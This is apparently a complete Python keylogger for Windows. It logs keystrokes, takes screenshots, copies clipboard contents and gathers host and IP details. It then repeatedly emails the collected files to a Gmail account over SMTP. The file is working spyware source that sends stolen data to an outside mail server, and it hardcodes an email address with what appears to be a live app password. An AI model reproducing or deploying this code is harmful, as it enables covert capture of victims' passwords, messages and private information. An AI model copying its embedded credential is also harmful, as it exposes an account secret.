#libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from  email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key,Listener
import time

from requests import get

from PIL import ImageGrab


key_information_full="key_log_full.txt"
key_information="key_log.txt"

system_information="systeminfo.txt"
clipboard_information="clipboard.txt"
screenshots_information="screenshot.png"

file_path="kelogger"
extend="\\"

sender_email = "saivishwas737146@gmail.com"
app_password = "ptfe wfst ldtj oyvy"
receiver_email = "saivishwas737146@gmail.com"
subject = "Test Email with Attachment"
body = "This is a test email with an attachment."
attachment_path = key_information

def send_email(sender_email, app_password, receiver_email, subject, body, attachment_paths):
    # Create the MIME object
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    # Attach the body of the email
    msg.attach(MIMEText(body, 'plain'))

    # # Attach the file
    # with open(attachment_path, 'rb') as attachment:
    #     attachment_part = MIMEBase('application', 'octet-stream')
    #     attachment_part.set_payload(attachment.read())
    #     encoders.encode_base64(attachment_part)
    #     attachment_part.add_header('Content-Disposition', f"attachment; filename= {attachment_path}")
    #     msg.attach(attachment_part)


    for attachment_path in attachment_paths:
        with open(attachment_path, 'rb') as attachment:
            attachment_part = MIMEBase('application', 'octet-stream')
            attachment_part.set_payload(attachment.read())
            encoders.encode_base64(attachment_part)
            attachment_part.add_header('Content-Disposition', f"attachment; filename= {attachment_path}")
            msg.attach(attachment_part)

    try:
        # Connect to Gmail's SMTP server
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()

            # Login to your Gmail account using the App Password
            server.login(sender_email, app_password)

            # Send the email
            server.sendmail(sender_email, receiver_email, msg.as_string())

        print("Email sent successfully")

    except Exception as e:
        print(f"Error: {e}")

# send_email(sender_email, app_password, receiver_email, subject, body, attachment_path)


def computer_information():
    with open(system_information,"w")as f:
        hostname= socket.gethostname() # network info
        IPAddr=socket.gethostbyname(hostname)
        try:
            pass
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address : "+ public_ip +'\n')
        except:
            f.write("could not get public ip")
        f.write("Processor: " + (platform.processor()) + '\n') #hardware info
        f.write("system: "+platform.system()+" "+platform.version()+'\n')
        f.write("Machine: "+ platform.machine()+'\n')
        f.write("Hostname: "+hostname +'\n')
        f.write("Private IP Address: "+IPAddr+'\n')

computer_information()
# send_email(sender_email, app_password, receiver_email, subject, body, [system_information])

def copy_clipboard():
    with open(clipboard_information,"a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard: \n"+ pasted_data)
            print("copied")
        except:
            f.write("Clipboard could not be copied")

def screenshot():
    im = ImageGrab.grab()
    im.save(screenshots_information)
    print("screen captured")

number_of_iterations_end=2
time_iteration=15
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

count=0
keys=[]
while number_of_iterations < number_of_iterations_end:
    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count+=1
        currentTime = time.time()
        if count>=1:
            count=0
            write_file(keys)
            keys=[]

    def write_file(keys):
        # with open(key_information,"a") as f:
        #     for key in keys:
        #         k=str(key).replace("'","")
        #         if k.find("enter")>0 :
        #             f.write('\n')
        #         elif k.find("space") > 0:
        #             f.write(" ")
        #         else:
        #             f.write(k)
        #         print(k)
        #     f.close()
        with open(key_information_full, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if "Key.shift_r" in k:
                    continue
                if k.find("enter") > 0:
                    f.write('\n')
                elif k.find("space") > 0:
                    f.write(" ")
                else:
                    f.write(k)
                print(k)
            f.close()
    def on_release(key):
        if key == Key.esc:
            print("stopping1")
            return False
        if currentTime>stoppingTime:
            return False

    with Listener(on_press=on_press ,on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime :
        with open(key_information,'w') as f:
            f.write(" ")
        print("running")
        screenshot()
        copy_clipboard()
        send_email(sender_email, app_password, receiver_email, subject, body, [screenshots_information,key_information_full,clipboard_information])
        number_of_iterations+=1
        number_of_iterations_end+=1
        currentTime=time.time()
        stoppingTime=time.time() + time_iteration

